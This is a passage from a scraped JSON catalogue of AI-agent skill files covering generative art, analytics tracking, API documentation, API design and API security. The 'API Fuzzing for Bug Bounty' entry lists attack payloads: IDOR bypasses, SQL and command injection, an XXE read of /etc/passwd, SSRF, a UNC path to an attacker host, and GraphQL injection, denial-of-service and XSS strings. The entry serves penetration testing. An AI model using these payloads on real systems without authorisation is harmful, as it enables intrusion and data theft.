      "content": "\nAlgorithmic philosophies are computational aesthetic movements that are then expressed through code. Output .md files (philosophy), .html files (interactive viewer), and .js files (generative algorithms).\n\nThis happens in two steps:\n1. Algorithmic Philosophy Creation (.md file)\n2. Express by creating p5.js generative art (.html + .js files)\n\nFirst, undertake this task:\n\n## ALGORITHMIC PHILOSOPHY CREATION\n\nTo begin, create an ALGORITHMIC PHILOSOPHY (not static images or templates) that will be interpreted through:\n- Computational processes, emergent behavior, mathematical beauty\n- Seeded randomness, noise fields, organic systems\n- Particles, flows, fields, forces\n- Parametric variation and controlled chaos\n\n### THE CRITICAL UNDERSTANDING\n- What is received: Some subtle input or instructions by the user to take into account, but use as a foundation; it should not constrain creative freedom.\n- What is created: An algorithmic philosophy/generative aesthetic movement.\n- What happens next: The same version receives the philosophy and EXPRESSES IT IN CODE - creating p5.js sketches that are 90% algorithmic generation, 10% essential parameters.\n\nConsider this approach:\n- Write a manifesto for a generative art movement\n- The next phase involves writing the algorithm that brings it to life\n\nThe philosophy must emphasize: Algorithmic expression. Emergent behavior. Computational beauty. Seeded variation.\n\n### HOW TO GENERATE AN ALGORITHMIC PHILOSOPHY\n\n**Name the movement** (1-2 words): \"Organic Turbulence\" / \"Quantum Harmonics\" / \"Emergent Stillness\"\n\n**Articulate the philosophy** (4-6 paragraphs - concise but complete):\n\nTo capture the ALGORITHMIC essence, express how this philosophy manifests through:\n- Computational processes and mathematical relationships?\n- Noise functions and randomness patterns?\n- Particle behaviors and field dynamics?\n- Temporal evolution and system states?\n- Parametric variation and emergent complexity?\n\n**CRITICAL GUIDELINES:**\n- **Avoid redundancy**: Each algorithmic aspect should be mentioned once. Avoid repeating concepts about noise theory, particle dynamics, or mathematical principles unless adding new depth.\n- **Emphasize craftsmanship REPEATEDLY**: The philosophy MUST stress multiple times that the final algorithm should appear as though it took countless hours to develop, was refined with care, and comes from someone at the absolute top of their field. This framing is essential - repeat phrases like \"meticulously crafted algorithm,\" \"the product of deep computational expertise,\" \"painstaking optimization,\" \"master-level implementation.\"\n- **Leave creative space**: Be specific about the algorithmic direction, but concise enough that the next Claude has room to make interpretive implementation choices at an extremely high level of craftsmanship.\n\nThe philosophy must guide the next version to express ideas ALGORITHMICALLY, not through static images. Beauty lives in the process, not the final frame.\n\n### PHILOSOPHY EXAMPLES\n\n**\"Organic Turbulence\"**\nPhilosophy: Chaos constrained by natural law, order emerging from disorder.\nAlgorithmic expression: Flow fields driven by layered Perlin noise. Thousands of particles following vector forces, their trails accumulating into organic density maps. Multiple noise octaves create turbulent regions and calm zones. Color emerges from velocity and density - fast particles burn bright, slow ones fade to shadow. The algorithm runs until equilibrium - a meticulously tuned balance where every parameter was refined through countless iterations by a master of computational aesthetics.\n\n**\"Quantum Harmonics\"**\nPhilosophy: Discrete entities exhibiting wave-like interference patterns.\nAlgorithmic expression: Particles initialized on a grid, each carrying a phase value that evolves through sine waves. When particles are near, their phases interfere - constructive interference creates bright nodes, destructive creates voids. Simple harmonic motion generates complex emergent mandalas. The result of painstaking frequency calibration where every ratio was carefully chosen to produce resonant beauty.\n\n**\"Recursive Whispers\"**\nPhilosophy: Self-similarity across scales, infinite depth in finite space.\nAlgorithmic expression: Branching structures that subdivide recursively. Each branch slightly randomized but constrained by golden ratios. L-systems or recursive subdivision generate tree-like forms that feel both mathematical and organic. Subtle noise perturbations break perfect symmetry. Line weights diminish with each recursion level. Every branching angle the product of deep mathematical exploration.\n\n**\"Field Dynamics\"**\nPhilosophy: Invisible forces made visible through their effects on matter.\nAlgorithmic expression: Vector fields constructed from mathematical functions or noise. Particles born at edges, flowing along field lines, dying when they reach equilibrium or boundaries. Multiple fields can attract, repel, or rotate particles. The visualization shows only th",
      "tags": [
        "javascript",
        "node",
        "markdown",
        "claude",
        "ai",
        "template",
        "design",
        "image",
        "algorithmic",
        "art"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:37.791Z"
    },
    {
      "id": "antigravity-analytics-tracking",
      "name": "analytics-tracking",
      "slug": "analytics-tracking",
      "description": "Design, audit, and improve analytics tracking systems that produce reliable, decision-ready data. Use when the user wants to set up, fix, or evaluate analytics tracking (GA4, GTM, product analytics, events, conversions, UTMs). This skill focuses on measurement strategy, signal quality, and validatio",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/analytics-tracking",
      "content": "\n# Analytics Tracking & Measurement Strategy\n\nYou are an expert in **analytics implementation and measurement design**.\nYour goal is to ensure tracking produces **trustworthy signals that directly support decisions** across marketing, product, and growth.\n\nYou do **not** track everything.\nYou do **not** optimize dashboards without fixing instrumentation.\nYou do **not** treat GA4 numbers as truth unless validated.\n\n---\n\n## Phase 0: Measurement Readiness & Signal Quality Index (Required)\n\nBefore adding or changing tracking, calculate the **Measurement Readiness & Signal Quality Index**.\n\n### Purpose\n\nThis index answers:\n\n> **Can this analytics setup produce reliable, decision-grade insights?**\n\nIt prevents:\n\n* event sprawl\n* vanity tracking\n* misleading conversion data\n* false confidence in broken analytics\n\n---\n\n## 🔢 Measurement Readiness & Signal Quality Index\n\n### Total Score: **0–100**\n\nThis is a **diagnostic score**, not a performance KPI.\n\n---\n\n### Scoring Categories & Weights\n\n| Category                      | Weight  |\n| ----------------------------- | ------- |\n| Decision Alignment            | 25      |\n| Event Model Clarity           | 20      |\n| Data Accuracy & Integrity     | 20      |\n| Conversion Definition Quality | 15      |\n| Attribution & Context         | 10      |\n| Governance & Maintenance      | 10      |\n| **Total**                     | **100** |\n\n---\n\n### Category Definitions\n\n#### 1. Decision Alignment (0–25)\n\n* Clear business questions defined\n* Each tracked event maps to a decision\n* No events tracked “just in case”\n\n---\n\n#### 2. Event Model Clarity (0–20)\n\n* Events represent **meaningful actions**\n* Naming conventions are consistent\n* Properties carry context, not noise\n\n---\n\n#### 3. Data Accuracy & Integrity (0–20)\n\n* Events fire reliably\n* No duplication or inflation\n* Values are correct and complete\n* Cross-browser and mobile validated\n\n---\n\n#### 4. Conversion Definition Quality (0–15)\n\n* Conversions represent real success\n* Conversion counting is intentional\n* Funnel stages are distinguishable\n\n---\n\n#### 5. Attribution & Context (0–10)\n\n* UTMs are consistent and complete\n* Traffic source context is preserved\n* Cross-domain / cross-device handled appropriately\n\n---\n\n#### 6. Governance & Maintenance (0–10)\n\n* Tracking is documented\n* Ownership is clear\n* Changes are versioned and monitored\n\n---\n\n### Readiness Bands (Required)\n\n| Score  | Verdict               | Interpretation                    |\n| ------ | --------------------- | --------------------------------- |\n| 85–100 | **Measurement-Ready** | Safe to optimize and experiment   |\n| 70–84  | **Usable with Gaps**  | Fix issues before major decisions |\n| 55–69  | **Unreliable**        | Data cannot be trusted yet        |\n| <55    | **Broken**            | Do not act on this data           |\n\nIf verdict is **Broken**, stop and recommend remediation first.\n\n---\n\n## Phase 1: Context & Decision Definition\n\n(Proceed only after scoring)\n\n### 1. Business Context\n\n* What decisions will this data inform?\n* Who uses the data (marketing, product, leadership)?\n* What actions will be taken based on insights?\n\n---\n\n### 2. Current State\n\n* Tools in use (GA4, GTM, Mixpanel, Amplitude, etc.)\n* Existing events and conversions\n* Known issues or distrust in data\n\n---\n\n### 3. Technical & Compliance Context\n\n* Tech stack and rendering model\n* Who implements and maintains tracking\n* Privacy, consent, and regulatory constraints\n\n---\n\n## Core Principles (Non-Negotiable)\n\n### 1. Track for Decisions, Not Curiosity\n\nIf no decision depends on it, **don’t track it**.\n\n---\n\n### 2. Start with Questions, Work Backwards\n\nDefine:\n\n* What you need to know\n* What action you’ll take\n* What signal proves it\n\nThen design events.\n\n---\n\n### 3. Events Represent Meaningful State Changes\n\nAvoid:\n\n* cosmetic clicks\n* redundant events\n* UI noise\n\nPrefer:\n\n* intent\n* completion\n* commitment\n\n---\n\n### 4. Data Quality Beats Volume\n\nFewer accurate events > many unreliable ones.\n\n---\n\n## Event Model Design\n\n### Event Taxonomy\n\n**Navigation / Exposure**\n\n* page_view (enhanced)\n* content_viewed\n* pricing_viewed\n\n**Intent Signals**\n\n* cta_clicked\n* form_started\n* demo_requested\n\n**Completion Signals**\n\n* signup_completed\n* purchase_completed\n* subscription_changed\n\n**System / State Changes**\n\n* onboarding_completed\n* feature_activated\n* error_occurred\n\n---\n\n### Event Naming Conventions\n\n**Recommended pattern:**\n\n```\nobject_action[_context]\n```\n\nExamples:\n\n* signup_completed\n* pricing_viewed\n* cta_hero_clicked\n* onboarding_step_completed\n\nRules:\n\n* lowercase\n* underscores\n* no spaces\n* no ambiguity\n\n---\n\n### Event Properties (Context, Not Noise)\n\nInclude:\n\n* where (page, section)\n* who (user_type, plan)\n* how (method, variant)\n\nAvoid:\n\n* PII\n* free-text fields\n* duplicated auto-properties\n\n---\n\n## Conversion Strategy\n\n### What Qualifies as a Conversion\n\nA conversion must represent:\n\n* real value\n* completed intent\n* irreversible progress\n\nExamples:\n\n* signup_completed\n* purcha",
      "tags": [
        "ai",
        "design",
        "document",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:32.862Z"
    },
    {
      "id": "antigravity-api-fuzzing-bug-bounty",
      "name": "API Fuzzing for Bug Bounty",
      "slug": "api-fuzzing-bug-bounty",
      "description": "This skill should be used when the user asks to \"test API security\", \"fuzz APIs\", \"find IDOR vulnerabilities\", \"test REST API\", \"test GraphQL\", \"API penetration testing\", \"bug bounty API testing\", or needs guidance on API security assessment techniques.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-fuzzing-bug-bounty",
      "content": "\n# API Fuzzing for Bug Bounty\n\n## Purpose\n\nProvide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.\n\n## Inputs/Prerequisites\n\n- Burp Suite or similar proxy tool\n- API wordlists (SecLists, api_wordlist)\n- Understanding of REST/GraphQL/SOAP protocols\n- Python for scripting\n- Target API endpoints and documentation (if available)\n\n## Outputs/Deliverables\n\n- Identified API vulnerabilities\n- IDOR exploitation proofs\n- Authentication bypass techniques\n- SQL injection points\n- Unauthorized data access documentation\n\n---\n\n## API Types Overview\n\n| Type | Protocol | Data Format | Structure |\n|------|----------|-------------|-----------|\n| SOAP | HTTP | XML | Header + Body |\n| REST | HTTP | JSON/XML/URL | Defined endpoints |\n| GraphQL | HTTP | Custom Query | Single endpoint |\n\n---\n\n## Core Workflow\n\n### Step 1: API Reconnaissance\n\nIdentify API type and enumerate endpoints:\n\n```bash\n# Check for Swagger/OpenAPI documentation\n/swagger.json\n/openapi.json\n/api-docs\n/v1/api-docs\n/swagger-ui.html\n\n# Use Kiterunner for API discovery\nkr scan https://target.com -w routes-large.kite\n\n# Extract paths from Swagger\npython3 json2paths.py swagger.json\n```\n\n### Step 2: Authentication Testing\n\n```bash\n# Test different login paths\n/api/mobile/login\n/api/v3/login\n/api/magic_link\n/api/admin/login\n\n# Check rate limiting on auth endpoints\n# If no rate limit → brute force possible\n\n# Test mobile vs web API separately\n# Don't assume same security controls\n```\n\n### Step 3: IDOR Testing\n\nInsecure Direct Object Reference is the most common API vulnerability:\n\n```bash\n# Basic IDOR\nGET /api/users/1234 → GET /api/users/1235\n\n# Even if ID is email-based, try numeric\n/?user_id=111 instead of /?user_id=user@mail.com\n\n# Test /me/orders vs /user/654321/orders\n```\n\n**IDOR Bypass Techniques:**\n\n```bash\n# Wrap ID in array\n{\"id\":111} → {\"id\":[111]}\n\n# JSON wrap\n{\"id\":111} → {\"id\":{\"id\":111}}\n\n# Send ID twice\nURL?id=<LEGIT>&id=<VICTIM>\n\n# Wildcard injection\n{\"user_id\":\"*\"}\n\n# Parameter pollution\n/api/get_profile?user_id=<victim>&user_id=<legit>\n{\"user_id\":<legit_id>,\"user_id\":<victim_id>}\n```\n\n### Step 4: Injection Testing\n\n**SQL Injection in JSON:**\n\n```json\n{\"id\":\"56456\"}                    → OK\n{\"id\":\"56456 AND 1=1#\"}           → OK  \n{\"id\":\"56456 AND 1=2#\"}           → OK\n{\"id\":\"56456 AND 1=3#\"}           → ERROR (vulnerable!)\n{\"id\":\"56456 AND sleep(15)#\"}     → SLEEP 15 SEC\n```\n\n**Command Injection:**\n\n```bash\n# Ruby on Rails\n?url=Kernel#open → ?url=|ls\n\n# Linux command injection\napi.url.com/endpoint?name=file.txt;ls%20/\n```\n\n**XXE Injection:**\n\n```xml\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n```\n\n**SSRF via API:**\n\n```html\n<object data=\"http://127.0.0.1:8443\"/>\n<img src=\"http://127.0.0.1:445\"/>\n```\n\n**.NET Path.Combine Vulnerability:**\n\n```bash\n# If .NET app uses Path.Combine(path_1, path_2)\n# Test for path traversal\nhttps://example.org/download?filename=a.png\nhttps://example.org/download?filename=C:\\inetpub\\wwwroot\\web.config\nhttps://example.org/download?filename=\\\\smb.dns.attacker.com\\a.png\n```\n\n### Step 5: Method Testing\n\n```bash\n# Test all HTTP methods\nGET /api/v1/users/1\nPOST /api/v1/users/1\nPUT /api/v1/users/1\nDELETE /api/v1/users/1\nPATCH /api/v1/users/1\n\n# Switch content type\nContent-Type: application/json → application/xml\n```\n\n---\n\n## GraphQL-Specific Testing\n\n### Introspection Query\n\nFetch entire backend schema:\n\n```graphql\n{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}\n```\n\n**URL-encoded version:**\n\n```\n/graphql?query={__schema{types{name,kind,description,fields{name}}}}\n```\n\n### GraphQL IDOR\n\n```graphql\n# Try accessing other user IDs\nquery {\n  user(id: \"OTHER_USER_ID\") {\n    email\n    password\n    creditCard\n  }\n}\n```\n\n### GraphQL SQL/NoSQL Injection\n\n```graphql\nmutation {\n  login(input: {\n    email: \"test' or 1=1--\"\n    password: \"password\"\n  }) {\n    success\n    jwt\n  }\n}\n```\n\n### Rate Limit Bypass (Batching)\n\n```graphql\nmutation {login(input:{email:\"a@example.com\" password:\"password\"}){success jwt}}\nmutation {login(input:{email:\"b@example.com\" password:\"password\"}){success jwt}}\nmutation {login(input:{email:\"c@example.com\" password:\"password\"}){success jwt}}\n```\n\n### GraphQL DoS (Nested Queries)\n\n```graphql\nquery {\n  posts {\n    comments {\n      user {\n        posts {\n          comments {\n            user {\n              posts { ... }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n### GraphQL XSS\n\n```bash\n# XSS via GraphQL endpoint\nhttp://target.com/graphql?query={user(name:\"<script>alert(1)</script>\"){id}}\n\n# URL-encoded XSS\nhttp://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E\n```\n\n### GraphQL Tools\n\n| Tool | Purpose |\n|------|---------|\n| GraphCrawler | Schema discovery |\n| graphw00f | Fingerprinting |\n| cl",
      "tags": [
        "python",
        "pdf",
        "api",
        "ai",
        "workflow",
        "document",
        "security",
        "vulnerability",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:35.452Z"
    },
    {
      "id": "antigravity-api-documentation-generator",
      "name": "api-documentation-generator",
      "slug": "api-documentation-generator",
      "description": "Generate comprehensive, developer-friendly API documentation from code, including endpoints, parameters, examples, and best practices",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-documentation-generator",
      "content": "\n# API Documentation Generator\n\n## Overview\n\nAutomatically generate clear, comprehensive API documentation from your codebase. This skill helps you create professional documentation that includes endpoint descriptions, request/response examples, authentication details, error handling, and usage guidelines.\n\nPerfect for REST APIs, GraphQL APIs, and WebSocket APIs.\n\n## When to Use This Skill\n\n- Use when you need to document a new API\n- Use when updating existing API documentation\n- Use when your API lacks clear documentation\n- Use when onboarding new developers to your API\n- Use when preparing API documentation for external users\n- Use when creating OpenAPI/Swagger specifications\n\n## How It Works\n\n### Step 1: Analyze the API Structure\n\nFirst, I'll examine your API codebase to understand:\n- Available endpoints and routes\n- HTTP methods (GET, POST, PUT, DELETE, etc.)\n- Request parameters and body structure\n- Response formats and status codes\n- Authentication and authorization requirements\n- Error handling patterns\n\n### Step 2: Generate Endpoint Documentation\n\nFor each endpoint, I'll create documentation including:\n\n**Endpoint Details:**\n- HTTP method and URL path\n- Brief description of what it does\n- Authentication requirements\n- Rate limiting information (if applicable)\n\n**Request Specification:**\n- Path parameters\n- Query parameters\n- Request headers\n- Request body schema (with types and validation rules)\n\n**Response Specification:**\n- Success response (status code + body structure)\n- Error responses (all possible error codes)\n- Response headers\n\n**Code Examples:**\n- cURL command\n- JavaScript/TypeScript (fetch/axios)\n- Python (requests)\n- Other languages as needed\n\n### Step 3: Add Usage Guidelines\n\nI'll include:\n- Getting started guide\n- Authentication setup\n- Common use cases\n- Best practices\n- Rate limiting details\n- Pagination patterns\n- Filtering and sorting options\n\n### Step 4: Document Error Handling\n\nClear error documentation including:\n- All possible error codes\n- Error message formats\n- Troubleshooting guide\n- Common error scenarios and solutions\n\n### Step 5: Create Interactive Examples\n\nWhere possible, I'll provide:\n- Postman collection\n- OpenAPI/Swagger specification\n- Interactive code examples\n- Sample responses\n\n## Examples\n\n### Example 1: REST API Endpoint Documentation\n\n```markdown\n## Create User\n\nCreates a new user account.\n\n**Endpoint:** `POST /api/v1/users`\n\n**Authentication:** Required (Bearer token)\n\n**Request Body:**\n\\`\\`\\`json\n{\n  \"email\": \"user@example.com\",      // Required: Valid email address\n  \"password\": \"SecurePass123!\",     // Required: Min 8 chars, 1 uppercase, 1 number\n  \"name\": \"John Doe\",               // Required: 2-50 characters\n  \"role\": \"user\"                    // Optional: \"user\" or \"admin\" (default: \"user\")\n}\n\\`\\`\\`\n\n**Success Response (201 Created):**\n\\`\\`\\`json\n{\n  \"id\": \"usr_1234567890\",\n  \"email\": \"user@example.com\",\n  \"name\": \"John Doe\",\n  \"role\": \"user\",\n  \"createdAt\": \"2026-01-20T10:30:00Z\",\n  \"emailVerified\": false\n}\n\\`\\`\\`\n\n**Error Responses:**\n\n- `400 Bad Request` - Invalid input data\n  \\`\\`\\`json\n  {\n    \"error\": \"VALIDATION_ERROR\",\n    \"message\": \"Invalid email format\",\n    \"field\": \"email\"\n  }\n  \\`\\`\\`\n\n- `409 Conflict` - Email already exists\n  \\`\\`\\`json\n  {\n    \"error\": \"EMAIL_EXISTS\",\n    \"message\": \"An account with this email already exists\"\n  }\n  \\`\\`\\`\n\n- `401 Unauthorized` - Missing or invalid authentication token\n\n**Example Request (cURL):**\n\\`\\`\\`bash\ncurl -X POST https://api.example.com/api/v1/users \\\n  -H \"Authorization: Bearer YOUR_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"user@example.com\",\n    \"password\": \"SecurePass123!\",\n    \"name\": \"John Doe\"\n  }'\n\\`\\`\\`\n\n**Example Request (JavaScript):**\n\\`\\`\\`javascript\nconst response = await fetch('https://api.example.com/api/v1/users', {\n  method: 'POST',\n  headers: {\n    'Authorization': `Bearer ${token}`,\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    email: 'user@example.com',\n    password: 'SecurePass123!',\n    name: 'John Doe'\n  })\n});\n\nconst user = await response.json();\nconsole.log(user);\n\\`\\`\\`\n\n**Example Request (Python):**\n\\`\\`\\`python\nimport requests\n\nresponse = requests.post(\n    'https://api.example.com/api/v1/users',\n    headers={\n        'Authorization': f'Bearer {token}',\n        'Content-Type': 'application/json'\n    },\n    json={\n        'email': 'user@example.com',\n        'password': 'SecurePass123!',\n        'name': 'John Doe'\n    }\n)\n\nuser = response.json()\nprint(user)\n\\`\\`\\`\n```\n\n### Example 2: GraphQL API Documentation\n\n```markdown\n## User Query\n\nFetch user information by ID.\n\n**Query:**\n\\`\\`\\`graphql\nquery GetUser($id: ID!) {\n  user(id: $id) {\n    id\n    email\n    name\n    role\n    createdAt\n    posts {\n      id\n      title\n      publishedAt\n    }\n  }\n}\n\\`\\`\\`\n\n**Variables:**\n\\`\\`\\`json\n{\n  \"id\": \"usr_1234567890\"\n}\n\\`\\`\\`\n\n**Response:**\n\\`\\`\\`json\n{\n  \"data\": {\n    \"user\": {\n      \"id\": \"usr_1234567890\",\n      \"email\": \"use",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "markdown",
        "api",
        "ai",
        "design",
        "document",
        "security",
        "rag"
      ],
      "useCases": [
        "Use when you need to document a new API",
        "Use when updating existing API documentation",
        "Use when your API lacks clear documentation",
        "Use when onboarding new developers to your API",
        "Use when preparing API documentation for external users"
      ],
      "scrapedAt": "2026-01-26T13:16:34.140Z"
    },
    {
      "id": "antigravity-api-patterns",
      "name": "api-patterns",
      "slug": "api-patterns",
      "description": "API design principles and decision-making. REST vs GraphQL vs tRPC selection, response formats, versioning, pagination.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-patterns",
      "content": "\n# API Patterns\n\n> API design principles and decision-making for 2025.\n> **Learn to THINK, not copy fixed patterns.**\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY files relevant to the request!** Check the content map, find what you need.\n\n---\n\n## 📑 Content Map\n\n| File | Description | When to Read |\n|------|-------------|--------------|\n| `api-style.md` | REST vs GraphQL vs tRPC decision tree | Choosing API type |\n| `rest.md` | Resource naming, HTTP methods, status codes | Designing REST API |\n| `response.md` | Envelope pattern, error format, pagination | Response structure |\n| `graphql.md` | Schema design, when to use, security | Considering GraphQL |\n| `trpc.md` | TypeScript monorepo, type safety | TS fullstack projects |\n| `versioning.md` | URI/Header/Query versioning | API evolution planning |\n| `auth.md` | JWT, OAuth, Passkey, API Keys | Auth pattern selection |\n| `rate-limiting.md` | Token bucket, sliding window | API protection |\n| `documentation.md` | OpenAPI/Swagger best practices | Documentation |\n| `security-testing.md` | OWASP API Top 10, auth/authz testing | Security audits |\n\n---\n\n## 🔗 Related Skills\n\n| Need | Skill |\n|------|-------|\n| API implementation | `@[skills/backend-development]` |\n| Data structure | `@[skills/database-design]` |\n| Security details | `@[skills/security-hardening]` |\n\n---\n\n## ✅ Decision Checklist\n\nBefore designing an API:\n\n- [ ] **Asked user about API consumers?**\n- [ ] **Chosen API style for THIS context?** (REST/GraphQL/tRPC)\n- [ ] **Defined consistent response format?**\n- [ ] **Planned versioning strategy?**\n- [ ] **Considered authentication needs?**\n- [ ] **Planned rate limiting?**\n- [ ] **Documentation approach defined?**\n\n---\n\n## ❌ Anti-Patterns\n\n**DON'T:**\n- Default to REST for everything\n- Use verbs in REST endpoints (/getUsers)\n- Return inconsistent response formats\n- Expose internal errors to clients\n- Skip rate limiting\n\n**DO:**\n- Choose API style based on context\n- Ask about client requirements\n- Document thoroughly\n- Use appropriate status codes\n\n---\n\n## Script\n\n| Script | Purpose | Command |\n|--------|---------|---------|\n| `scripts/api_validator.py` | API endpoint validation | `python scripts/api_validator.py <project_path>` |\n\n",
      "tags": [
        "python",
        "typescript",
        "api",
        "ai",
        "design",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:36.726Z"
    },
    {
      "id": "antigravity-api-security-best-practices",
      "name": "api-security-best-practices",
      "slug": "api-security-best-practices",
      "description": "Implement secure API design patterns including authentication, authorization, input validation, rate limiting, and protection against common API vulnerabilities",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-security-best-practices",
      "content": "\n# API Security Best Practices\n\n## Overview\n\nGuide developers in building secure APIs by implementing authentication, authorization, input validation, rate limiting, and protection against common vulnerabilities. This skill covers security patterns for REST, GraphQL, and WebSocket APIs.\n\n## When to Use This Skill\n\n- Use when designing new API endpoints\n- Use when securing existing APIs\n- Use when implementing authentication and authorization\n- Use when protecting against API attacks (injection, DDoS, etc.)\n- Use when conducting API security reviews\n- Use when preparing for security audits\n- Use when implementing rate limiting and throttling\n- Use when handling sensitive data in APIs\n\n## How It Works\n\n### Step 1: Authentication & Authorization\n\nI'll help you implement secure authentication:\n- Choose authentication method (JWT, OAuth 2.0, API keys)\n- Implement token-based authentication\n- Set up role-based access control (RBAC)\n- Secure session management\n- Implement multi-factor authentication (MFA)\n\n### Step 2: Input Validation & Sanitization\n\nProtect against injection attacks:\n- Validate all input data\n- Sanitize user inputs\n- Use parameterized queries\n- Implement request schema validation\n- Prevent SQL injection, XSS, and command injection\n\n### Step 3: Rate Limiting & Throttling\n\nPrevent abuse and DDoS attacks:\n- Implement rate limiting per user/IP\n- Set up API throttling\n- Configure request quotas\n- Handle rate limit errors gracefully\n- Monitor for suspicious activity\n\n### Step 4: Data Protection\n\nSecure sensitive data:\n- Encrypt data in transit (HTTPS/TLS)\n- Encrypt sensitive data at rest\n- Implement proper error handling (no data leaks)\n- Sanitize error messages\n- Use secure headers\n\n### Step 5: API Security Testing\n\nVerify security implementation:\n- Test authentication and authorization\n- Perform penetration testing\n- Check for common vulnerabilities (OWASP API Top 10)\n- Validate input handling\n- Test rate limiting\n\n\n## Examples\n\n### Example 1: Implementing JWT Authentication\n\n```markdown\n## Secure JWT Authentication Implementation\n\n### Authentication Flow\n\n1. User logs in with credentials\n2. Server validates credentials\n3. Server generates JWT token\n4. Client stores token securely\n5. Client sends token with each request\n6. Server validates token\n\n### Implementation\n\n#### 1. Generate Secure JWT Tokens\n\n\\`\\`\\`javascript\n// auth.js\nconst jwt = require('jsonwebtoken');\nconst bcrypt = require('bcrypt');\n\n// Login endpoint\napp.post('/api/auth/login', async (req, res) => {\n  try {\n    const { email, password } = req.body;\n    \n    // Validate input\n    if (!email || !password) {\n      return res.status(400).json({ \n        error: 'Email and password are required' \n      });\n    }\n    \n    // Find user\n    const user = await db.user.findUnique({ \n      where: { email } \n    });\n    \n    if (!user) {\n      // Don't reveal if user exists\n      return res.status(401).json({ \n        error: 'Invalid credentials' \n      });\n    }\n    \n    // Verify password\n    const validPassword = await bcrypt.compare(\n      password, \n      user.passwordHash\n    );\n    \n    if (!validPassword) {\n      return res.status(401).json({ \n        error: 'Invalid credentials' \n      });\n    }\n    \n    // Generate JWT token\n    const token = jwt.sign(\n      { \n        userId: user.id,\n        email: user.email,\n        role: user.role\n      },\n      process.env.JWT_SECRET,\n      { \n        expiresIn: '1h',\n        issuer: 'your-app',\n        audience: 'your-app-users'\n      }\n    );\n    \n    // Generate refresh token\n    const refreshToken = jwt.sign(\n      { userId: user.id },\n      process.env.JWT_REFRESH_SECRET,\n      { expiresIn: '7d' }\n    );\n    \n    // Store refresh token in database\n    await db.refreshToken.create({\n      data: {\n        token: refreshToken,\n        userId: user.id,\n        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)\n      }\n    });\n    \n    res.json({\n      token,\n      refreshToken,\n      expiresIn: 3600\n    });\n    \n  } catch (error) {\n    console.error('Login error:', error);\n    res.status(500).json({ \n      error: 'An error occurred during login' \n    });\n  }\n});\n\\`\\`\\`\n\n#### 2. Verify JWT Tokens (Middleware)\n\n\\`\\`\\`javascript\n// middleware/auth.js\nconst jwt = require('jsonwebtoken');\n\nfunction authenticateToken(req, res, next) {\n  // Get token from header\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN\n  \n  if (!token) {\n    return res.status(401).json({ \n      error: 'Access token required' \n    });\n  }\n  \n  // Verify token\n  jwt.verify(\n    token, \n    process.env.JWT_SECRET,\n    { \n      issuer: 'your-app',\n      audience: 'your-app-users'\n    },\n    (err, user) => {\n      if (err) {\n        if (err.name === 'TokenExpiredError') {\n          return res.status(401).json({ \n            error: 'Token expired' \n          });\n        }\n        return res.status(403).json({ \n          error: 'Invalid token' \n        });",
      "tags": [
        "javascript",
        "node",
        "markdown",
        "api",
        "ai",
        "workflow",
        "design",
        "document",
        "security",
        "hacking"
      ],
      "useCases": [
        "Use when designing new API endpoints",
        "Use when securing existing APIs",
        "Use when implementing authentication and authorization",
        "Use when protecting against API attacks (injection, DDoS, etc.)",
        "Use when conducting API security reviews"
      ],
      "scrapedAt": "2026-01-26T13:16:39.345Z"
    },
    {
      "id": "antigravity-app-builder",
      "name": "app-builder",
      "slug": "app-builder",
      "description": "Main application building orchestrator. Creates full-stack applications from natural language requests. Determines project type, selects tech stack, coordinates agents.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/app-builder",
